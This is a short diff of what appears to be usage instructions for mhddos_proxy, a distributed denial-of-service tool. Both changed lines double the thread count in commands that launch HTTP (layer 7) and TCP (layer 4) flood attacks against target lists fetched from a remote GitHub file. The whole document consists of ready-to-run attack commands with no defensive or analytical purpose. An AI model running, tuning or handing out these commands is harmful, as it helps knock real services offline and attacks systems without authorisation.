@@ -11,10 +11,10 @@ screen
 cd mhddos_proxy
 
 !!HTTP(L7):!!
-python3 runner.py -t 1000 --rpc 1000 --debug --http-methods STRESS GET -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l7_all.txt
+python3 runner.py -t 2000 --rpc 1000 --debug --http-methods STRESS GET -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l7_all.txt
 
 !!TCP(L4):!!
-python3 runner.py -t 1000 --rpc 1000 --debug -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l4_tcp_all.txt
+python3 runner.py -t 2000 --rpc 1000 --debug -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l4_tcp_all.txt
 
 
 
